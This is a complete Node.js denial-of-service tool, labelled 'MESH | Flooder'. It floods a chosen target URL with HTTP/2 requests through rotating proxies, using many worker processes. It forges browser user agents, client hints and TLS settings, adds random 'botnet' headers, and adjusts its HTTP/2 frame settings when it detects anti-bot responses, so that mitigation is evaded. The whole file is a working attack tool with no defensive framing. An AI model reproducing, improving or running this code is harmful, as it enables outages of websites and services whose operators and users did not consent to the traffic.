const http = require('http');
const tls = require('tls');
const cluster = require('cluster');
const fs = require('fs');
const url = require('url');
const os = require('os');
const http2 = require('http2-wrapper');
const { HeaderGenerator } = require('header-generator');
const cheerio = require('cheerio');

const [target, time, threads, ratelimit, proxyfile, mode] = process.argv.slice(2);

if (target == undefined) {
    console.log('[MESH | Flooder] 31.12.2023 23:59 last update <3');
    process.exit(-1);
}

const proxies = fs.readFileSync(proxyfile, 'utf-8').toString().replace(/\r/g, '').split('\n');
const parsed = url.parse(target);
let headers_sent = 0;
let headers_full = 0;
let proxy_using = 0;

let frame_1 = 65536;
let frame_2 = 6291456;
let frame_3 = 262144;
let frame_4 = 1000;
const randversion = Math.floor(Math.random() * (122 - 100 + 1)) + 100;
const numframesandrate1 = Math.floor(ratelimit / 4);
const numframesandrate2 = Math.floor(ratelimit / 2);

const agent = new http.Agent({
    keepAlive: true,
    maxSockets: Infinity,
    maxFreeSockets: Infinity,
    timeout: time * 1000,
});

let headerGenerator = new HeaderGenerator({
    browsers: [
        { name: "firefox", minVersion: 80 },
        { name: "chrome", minVersion: 80 },
        "safari"
    ],
    devices: [
        "desktop",
        "mobile",
    ],
    operatingSystems: [
        "windows",
        "linux"
    ]
});

function getRandomToken(length) {
    const characters = 'abcdefghijklmnopqrstuvwxyz';
    let result = '';
    for (let i = 0; i < length; i++) {
        const randomIndex = Math.floor(Math.random() * characters.length);
        result += characters[randomIndex];
    }
    return result;
}

function getHeaders(browser, device, target) {
    try {
        switch (browser) {
            case 'firefox':
                return getFirefoxHeaders(device, target);
            case 'edge':
                return getEdgeHeaders(device, target);
            case 'opera':
                return getOperaHeaders(device, target);
            case 'chrome':
                return getChromeHeaders(device, target);
            case 'random':
                return getRandomHeaders(device, target);
            default:
                return {};
        }
    } catch (err) {
        console.log(err);
    }
}

function getFirefoxHeaders(device, target) {
    try {
        const parsed = url.parse(target);
        let headers;
        switch (device) {
            case 'desktop':
                headers = {
                    ":method": "GET",
                    ":path": parsed.path,
                    ":authority": parsed.host,
                    ":scheme": "https",
                    "user-agent": `Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:${randversion}.0) Gecko/20100101 Firefox/${randversion}.0`,
                    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
                    "accept-language": "en-US,en;q=0.5",
                    "accept-encoding": "gzip, deflate, br",
                    "upgrade-insecure-requests": "1",
                    "sec-fetch-dest": "document",
                    "sec-fetch-mode": "navigate",
                    "sec-fetch-site": "same-origin",
                    "sec-fetch-user": "?1",
                    "te": "trailers",
                    "referer": `https://google.com/${getRandomToken(10)}`,
                };

                for (let i = 0; i < 50; i++) {
                    if (Math.random() < 0.5) {
                        headers[`custom-x-mesh${getRandomToken(7)}`] = `${getRandomToken(2)}-${getRandomToken(4)}=${getRandomToken(4)}`;
                    }
                    if (Math.random() < 0.5) {
                        headers[`custom-x-botnet${getRandomToken(5)}`] = `${getRandomToken(3)}-${getRandomToken(3)}=${getRandomToken(6)}`;
                    }
                }

                //frame_1 = 65536;         //HEADER_TABLE_SIZE
                // frame_2 = 131072;        //INITIAL_WINDOW_SIZE
                //frame_3 = 16384;         //MAX_FRAME_SIZE
                //frame_4 = 0;            //MAX_HEADER_LIST_SIZE

                return headers;

            case 'mobile':
                headers = {
                    ":method": "GET",
                    ":path": parsed.path,
                    ":authority": parsed.host,
                    ":scheme": "https",
                    "user-agent": `Mozilla/5.0 (Android 13; Mobile; rv:${randversion}.0) Gecko/121.0 Firefox/${randversion}.0`,
                    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
                    "accept-language": "ru-RU",
                    "accept-encoding": "gzip, deflate, br",
                    "upgrade-insecure-requests": "1",
                    "sec-fetch-dest": "document",
                    "sec-fetch-mode": "navigate",
                    "sec-fetch-site": "none",
                    "sec-fetch-user": "?1",
                    "te": "trailers",
                    "referer": `https://google.com/${getRandomToken(10)}`,
                };

                for (let i = 0; i < 50; i++) {
                    if (Math.random() < 0.5) {
                        headers[`custom-x-mesh${getRandomToken(7)}`] = `${getRandomToken(2)}-${getRandomToken(4)}=${getRandomToken(4)}`;
                    }
                    if (Math.random() < 0.5) {
                        headers[`custom-x-botnet${getRandomToken(5)}`] = `${getRandomToken(3)}-${getRandomToken(3)}=${getRandomToken(6)}`;
                    }
                }

                // frame_1 = 4096;         //HEADER_TABLE_SIZE
                // frame_2 = 32768;        //INITIAL_WINDOW_SIZE
                // frame_3 = 16384;         //MAX_FRAME_SIZE
                //frame_4 = 0;             //MAX_HEADER_LIST_SIZE

                return headers;

            default:
                return {};
        }
    } catch (err) {
        console.log(err);
    }
}

function getEdgeHeaders(device, target) {
    try {
        const parsed = url.parse(target);
        let headers;
        switch (device) {
            case 'desktop':
                headers = {
                    ":method": "GET",
                    ":authority": parsed.host,
                    ":scheme": "https",
                    ":path": parsed.path,
                    "sec-ch-ua": `"Not_A Brand";v="8", "Chromium";v="${randversion}", "Microsoft Edge";v="${randversion}"`,
                    "sec-ch-ua-mobile": "?0",
                    "sec-ch-ua-platform": "\\\"Windows\\\"",
                    "upgrade-insecure-requests": "1",
                    "user-agent": `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${randversion}.0.0.0 Safari/537.36 Edg/${randversion}.0.0.0`,
                    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                    "sec-fetch-site": "none",
                    "sec-fetch-mode": "navigate",
                    "sec-fetch-user": "?1",
                    "sec-fetch-dest": "document",
                    "accept-encoding": "gzip, deflate, br",
                    "accept-language": "ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7",
                    "referer": `https://google.com/${getRandomToken(10)}`,
                };

                for (let i = 0; i < 50; i++) {
                    if (Math.random() < 0.5) {
                        headers[`custom-x-mesh${getRandomToken(7)}`] = `${getRandomToken(2)}-${getRandomToken(4)}=${getRandomToken(4)}`;
                    }
                    if (Math.random() < 0.5) {
                        headers[`custom-x-botnet${getRandomToken(5)}`] = `${getRandomToken(3)}-${getRandomToken(3)}=${getRandomToken(6)}`;
                    }
                }

                /*frame_1 = 65536;             //HEADER_TABLE_SIZE
                frame_2 = 6291456;            //INITIAL_WINDOW_SIZE
                frame_3 = 0;                  //MAX_FRAME_SIZE
                frame_4 = 262144;             //MAX_HEADER_LIST_SIZE*/

                //console.log(headers, settings);
                return headers;

            case 'mobile':
                headers = {
                    ":method": "GET",
                    ":authority": parsed.host,
                    ":scheme": "https",
                    ":path": parsed.path,
                    "sec-ch-ua": `"Not_A Brand";v="8", "Chromium";v="${randversion}", "Microsoft Edge";v="${randversion}"`,
                    "sec-ch-ua-mobile": "?1",
                    "sec-ch-ua-platform": "\\\"Android\\\"",
                    "upgrade-insecure-requests": "1",
                    "user-agent": `Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${randversion}.0.0.0 Mobile Safari/537.36 EdgA/${randversion}.0.0.0`,
                    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                    "sec-fetch-site": "none",
                    "sec-fetch-mode": "navigate",
                    "sec-fetch-user": "?1",
                    "sec-fetch-dest": "document",
                    "accept-encoding": "gzip, deflate, br",
                    "accept-language": "ru-RU,ru;q=0.9,en-GB;q=0.8,en-US;q=0.7,en;q=0.6",
                    "referer": `https://google.com/${getRandomToken(10)}`,
                };

                for (let i = 0; i < 50; i++) {
                    if (Math.random() < 0.5) {
                        headers[`custom-x-mesh${getRandomToken(7)}`] = `${getRandomToken(2)}-${getRandomToken(4)}=${getRandomToken(4)}`;
                    }
                    if (Math.random() < 0.5) {
                        headers[`custom-x-botnet${getRandomToken(5)}`] = `${getRandomToken(3)}-${getRandomToken(3)}=${getRandomToken(6)}`;
                    }
                }

                //frame_1 = 65536;              //HEADER_TABLE_SIZE
                // frame_2 = 6291456;            //INITIAL_WINDOW_SIZE
                // frame_3 = 0;                  //MAX_FRAME_SIZE
                // frame_4 = 262144;             //MAX_HEADER_LIST_SIZE

                //console.log(headers, settings);
                return headers;

            default:
                return {};
        }
    } catch (err) {
        console.log(err);
    }
}

function getOperaHeaders(device, target) {
    try {
        const parsed = url.parse(target);
        let headers;
        switch (device) {
            case 'desktop':
                headers = {
                    ":method": "GET",
                    ":authority": parsed.host,
                    ":scheme": "https",
                    ":path": parsed.path,
                    "sec-ch-ua": `"Not_A Brand";v="8", "Chromium";v="${randversion}", "Opera";v="${randversion}"`,
                    "sec-ch-ua-mobile": "?0",
                    "sec-ch-ua-platform": "\\\"Windows\\\"",
                    "upgrade-insecure-requests": "1",
                    "user-agent": `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${randversion}.0.0.0 Safari/537.36 OPR/${randversion}.0.0.0`,
                    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                    "sec-fetch-site": "none",
                    "sec-fetch-mode": "navigate",
                    "sec-fetch-user": "?1",
                    "sec-fetch-dest": "document",
                    "accept-encoding": "gzip, deflate, br",
                    "accept-language": "ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7",
                    "referer": `https://google.com/${getRandomToken(10)}`,
                };

                for (let i = 0; i < 50; i++) {
                    if (Math.random() < 0.5) {
                        headers[`custom-x-mesh${getRandomToken(7)}`] = `${getRandomToken(2)}-${getRandomToken(4)}=${getRandomToken(4)}`;
                    }
                    if (Math.random() < 0.5) {
                        headers[`custom-x-botnet${getRandomToken(5)}`] = `${getRandomToken(3)}-${getRandomToken(3)}=${getRandomToken(6)}`;
                    }
                }


                //frame_1 = 65536;              //HEADER_TABLE_SIZE
                //frame_2 = 6291456;            //INITIAL_WINDOW_SIZE
                //frame_3 = 0;                  //MAX_FRAME_SIZE
                //frame_4 = 262144;             //MAX_HEADER_LIST_SIZE


                //console.log(headers, settings);
                return headers;

            case 'mobile':
                headers = {
                    ":method": "GET",
                    ":authority": parsed.host,
                    ":scheme": "https",
                    ":path": parsed.path,
                    "sec-ch-ua": `"Not_A Brand";v="8", "Chromium";v="${randversion}", "Android WebView";v="${randversion}"`,
                    "sec-ch-ua-mobile": "?1",
                    "sec-ch-ua-platform": "\\\"Android\\\"",
                    "upgrade-insecure-requests": "1",
                    "user-agent": `Mozilla/5.0 (Linux; Android 13; 2201117TG Build/TKQ1.221114.001) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${randversion}.0.6099.144 Mobile Safari/537.36 OPX/2.2`,
                    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                    "x-requested-with": "com.opera.gx",
                    "sec-fetch-site": "none",
                    "sec-fetch-mode": "navigate",
                    "sec-fetch-user": "?1",
                    "sec-fetch-dest": "document",
                    "accept-encoding": "gzip, deflate, br",
                    "accept-language": "ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7",
                    "referer": `https://google.com/${getRandomToken(10)}`,
                };

                for (let i = 0; i < 50; i++) {
                    if (Math.random() < 0.5) {
                        headers[`custom-x-mesh${getRandomToken(7)}`] = `${getRandomToken(2)}-${getRandomToken(4)}=${getRandomToken(4)}`;
                    }
                    if (Math.random() < 0.5) {
                        headers[`custom-x-botnet${getRandomToken(5)}`] = `${getRandomToken(3)}-${getRandomToken(3)}=${getRandomToken(6)}`;
                    }
                }


                //frame_1 = 65536;              //HEADER_TABLE_SIZE
                //frame_2 = 6291456;            //INITIAL_WINDOW_SIZE
                //frame_3 = 0;                  //MAX_FRAME_SIZE
                // frame_4 = 262144;             //MAX_HEADER_LIST_SIZE


                //console.log(headers, settings);
                return headers;

            default:
                return {};
        }
    } catch (err) {
        console.log(err);
    }
}

function getChromeHeaders(device, target) {
    try {
        const parsed = url.parse(target);
        let headers;
        switch (device) {
            case 'desktop':
                headers = {
                    ":method": "GET",
                    ":authority": parsed.host,
                    ":scheme": "https",
                    ":path": parsed.path,
                    "upgrade-insecure-requests": "1",
                    "user-agent": `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${randversion}.0.0.0 Safari/537.36`,
                    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                    "sec-ch-ua": `"Not_A Brand";v="8", "Chromium";v="${randversion}", "Google Chrome";v="${randversion}"`,
                    "sec-ch-ua-mobile": "?0",
                    "sec-ch-ua-platform": "\\\"Windows\\\"",
                    "sec-fetch-site": "none",
                    "sec-fetch-mode": "navigate",
                    "sec-fetch-user": "?1",
                    "sec-fetch-dest": "document",
                    "accept-encoding": "gzip, deflate, br",
                    "accept-language": "ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7",
                    "referer": `https://google.com/${getRandomToken(10)}`,
                };


                for (let i = 0; i < 50; i++) {
                    if (Math.random() < 0.5) {
                        headers[`custom-x-mesh${getRandomToken(7)}`] = `${getRandomToken(2)}-${getRandomToken(4)}=${getRandomToken(4)}`;
                    }
                    if (Math.random() < 0.5) {
                        headers[`custom-x-botnet${getRandomToken(5)}`] = `${getRandomToken(3)}-${getRandomToken(3)}=${getRandomToken(6)}`;
                    }
                }

                //frame_1 = 65536;            //HEADER_TABLE_SIZE
                //frame_2 = 6291456;          //INITIAL_WINDOW_SIZE
                // frame_3 = 0;                 //MAX_FRAME_SIZE
                // frame_4 = 262144;             //MAX_HEADER_LIST_SIZE


                //console.log(headers, settings);
                return headers;

            case 'mobile':
                headers = {
                    ":method": "GET",
                    ":authority": parsed.host,
                    ":scheme": "https",
                    ":path": parsed.path,
                    "sec-ch-ua": `"Not_A Brand";v="8", "Chromium";v="${randversion}", "Google Chrome";v="${randversion}"`,
                    "sec-ch-ua-mobile": "?1",
                    "sec-ch-ua-platform": "\\\"Android\\\"",
                    "upgrade-insecure-requests": "1",
                    "user-agent": `Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${randversion}.0.0.0 Mobile Safari/537.36`,
                    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                    "sec-fetch-site": "none",
                    "sec-fetch-mode": "navigate",
                    "sec-fetch-user": "?1",
                    "sec-fetch-dest": "document",
                    "accept-encoding": "gzip, deflate, br",
                    "accept-language": "ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7",
                    "referer": `https://google.com/${getRandomToken(10)}`,
                };

                for (let i = 0; i < 50; i++) {
                    if (Math.random() < 0.5) {
                        headers[`custom-x-mesh${getRandomToken(7)}`] = `${getRandomToken(2)}-${getRandomToken(4)}=${getRandomToken(4)}`;
                    }
                    if (Math.random() < 0.5) {
                        headers[`custom-x-botnet${getRandomToken(5)}`] = `${getRandomToken(3)}-${getRandomToken(3)}=${getRandomToken(6)}`;
                    }
                }

                //frame_1 = 65536;             //HEADER_TABLE_SIZE
                // frame_2 = 6291456;            //INITIAL_WINDOW_SIZE
                //frame_3 = 0;                  //MAX_FRAME_SIZE
                // frame_4 = 262144;            //MAX_HEADER_LIST_SIZE


                //console.log(headers, settings);
                return headers;

            default:
                return {};
        }
    } catch (err) {
        console.log(err);
    }
}


function getRandomHeaders(device, target) {
    try {
        const parsed = url.parse(target);
        let headers;

        let headers1 = headerGenerator.getHeaders({
            operatingSystems: [
                "linux"
            ],
            locales: ["en-US", "en"]
        });

        let headers2 = headerGenerator.getHeaders({
            operatingSystems: [
                "windows"
            ],
            locales: ["en-US", "en"]
        });

        switch (device) {
            case 'desktop':
                headers = {
                    ":method": "GET",
                    ":authority": parsed.host,
                    ":scheme": "https",
                    ":path": parsed.path,
                    ...headers1,
                    "referer": `https://google.com/${getRandomToken(10)}`,
                };

                for (let i = 0; i < 50; i++) {
                    if (Math.random() < 0.5) {
                        headers[`custom-x-mesh${getRandomToken(7)}`] = `${getRandomToken(2)}-${getRandomToken(4)}=${getRandomToken(4)}`;
                    }
                    if (Math.random() < 0.5) {
                        headers[`custom-x-botnet${getRandomToken(5)}`] = `${getRandomToken(3)}-${getRandomToken(3)}=${getRandomToken(6)}`;
                    }
                }


                //frame_1 = 65536;            //HEADER_TABLE_SIZE
                //frame_2 = 6291456;          //INITIAL_WINDOW_SIZE
                //frame_3 = 0;                 //MAX_FRAME_SIZE
                //frame_4 = 262144;             //MAX_HEADER_LIST_SIZE


                //console.log(headers, settings);
                return headers;

            case 'mobile':
                headers = {
                    ":method": "GET",
                    ":authority": parsed.host,
                    ":scheme": "https",
                    ":path": parsed.path,
                    ...headers2,
                    "referer": `https://google.com/${getRandomToken(10)}`,
                };

                for (let i = 0; i < 50; i++) {
                    if (Math.random() < 0.5) {
                        headers[`custom-x-mesh${getRandomToken(7)}`] = `${getRandomToken(2)}-${getRandomToken(4)}=${getRandomToken(4)}`;
                    }
                    if (Math.random() < 0.5) {
                        headers[`custom-x-botnet${getRandomToken(5)}`] = `${getRandomToken(3)}-${getRandomToken(3)}=${getRandomToken(6)}`;
                    }
                }


                // frame_1 = 65536;             //HEADER_TABLE_SIZE
                //frame_2 = 6291456;            //INITIAL_WINDOW_SIZE
                //frame_3 = 0;                  //MAX_FRAME_SIZE
                // frame_4 = 262144;            //MAX_HEADER_LIST_SIZE


                //console.log(headers, settings);
                return headers;

            default:
                return {};
        }
    } catch (err) {
        console.log(err);
    }
}

function work() {
    const [proxyHost, proxyPort] = proxies[Math.floor(Math.random() * proxies.length)].split(':');
    proxy_using++;
    const request = http.get({
        method: 'CONNECT',
        host: proxyHost,
        port: proxyPort,
        //agent,
        path: `${parsed.host}:443`,
        headers: { 'Connection': 'Keep-Alive' },
        //rejectUnauthorized: true,
    });

    request.on('error', request.destroy);

    request.on('connect', (res, socket, { head }) => {
        if (head?.length) return socket.destroy();

        const ciphers = ["TLS_AES_128_GCM_SHA256", "TLS_CHACHA20_POLY1305_SHA256", "TLS_AES_256_GCM_SHA384", "TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256"].join(":");
        const sigalgs = "ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512";
        var browsers = ["chrome", "random", "edge", "opera"];
        var randomBrowser = browsers[Math.floor(Math.random() * browsers.length)];
        var telebroworno = ["desktop", "mobile"];
        var randtele = telebroworno[Math.floor(Math.random() * telebroworno.length)];
        const hedaskfqjwfi = getHeaders(randomBrowser, randtele, target);
        const cwefk = Math.floor(Math.random() * (122 - 100 + 1)) + 100;
        const sessionOptions = {
            createConnection: (authority, option) => tls.connect({
                ...option,
                socket,
                servername: parsed.host,
                //session: head,
                //agent,
                secure: true,
                //requestOCSP: true,
                ALPNProtocols: ["h2", "http/1.1"],
                ciphers: ciphers,
                sigalgs: sigalgs,
                requestCert: true,
            }),
            settings: {
                ...(Math.random() < 0.5 && { headerTableSize: frame_1 }),
                enablePush: false,
                ...(Math.random() < 0.5 && { maxConcurrentStreams: frame_4 }),
                ...(frame_3 > 0 || Math.random() < 0.5 && { maxFrameSize: frame_3 }),
                ...(Math.random() < 0.5 && { initialWindowSize: frame_2 }),
                ...(frame_4 > 0 || Math.random() < 0.5 && { maxHeaderListSize: frame_4 }),
            },
        };

        const sessionState = { flags: 0 };

        const session = http2.connect(`https://${parsed.host}`, sessionOptions, () => {
            session.setLocalWindowSize(15663105);
        });

        let activeRequests = 0;
        let timeoutHandle;

        const resetTimeout = () => {
            headers_sent = 0;
            clearTimeout(timeoutHandle);
            timeoutHandle = setTimeout(() => activeRequests && session.destroy(), 3000);
        };

        const closeSessionIfDone = () => {
            if (!activeRequests) {
                sessionState.flags |= 1;
                session.destroy();
            }
        };

        session.on('error', () => {
            sessionState.flags |= 1;
            session.destroy();
        });

        const cheerio = require('cheerio');

        session.on('connect', () => {
            Array.from({ length: ratelimit }).forEach((_, index) => {
                requestHandler(session);
            });
            resetTimeout();
        });

        const requestHandler = (session) => {
            const req = session.request(getHeaders(randomBrowser, randtele, target));
            headers_sent++;
            headers_full++;

            function finalizeRequest() {
                activeRequests--;
                closeSessionIfDone();
            }

            let chunkData = Buffer.from('');
            req.setEncoding('utf8');

            req.on('data', (chunk) => {
                if (chunk.length > 0) {
                    chunkData += chunk;
                }
            });

            req.on('end', () => {
                const $ = cheerio.load(chunkData);
                const body = $('body').text();
                if (body.trim().length > 0) {
                    if (body.includes("�")) {
                        frame_1 = frame_1 + 1;
                        frame_2 = frame_2 + 1;
                        frame_3 = frame_3 + 1;
                        frame_4 = frame_4 + 1;
                        console.log('[Detected] $Known_Botnets : RELOAD FRAMES : Change...');
                    }
                }
                finalizeRequest();
            });

            req.end();

            req.on('error', (err) => {
                finalizeRequest();
            });
        };


    });

    request.end();
};


if (cluster.isMaster) {
    Array.from({ length: threads }, (_, i) => cluster.fork({ core: i % os.cpus().length }));

    cluster.on('exit', (worker) => {
        console.log(`Worker ${worker.process.pid} died. Restarting...`);
        cluster.fork({ core: worker.id % os.cpus().length });
    });

    setTimeout(() => process.exit(console.log('Primary process exiting...')), time * 1000);

} else {
    setInterval(work);
    setTimeout(() => process.exit(console.log(`Worker ${process.pid} exiting...`)), time * 1000);
}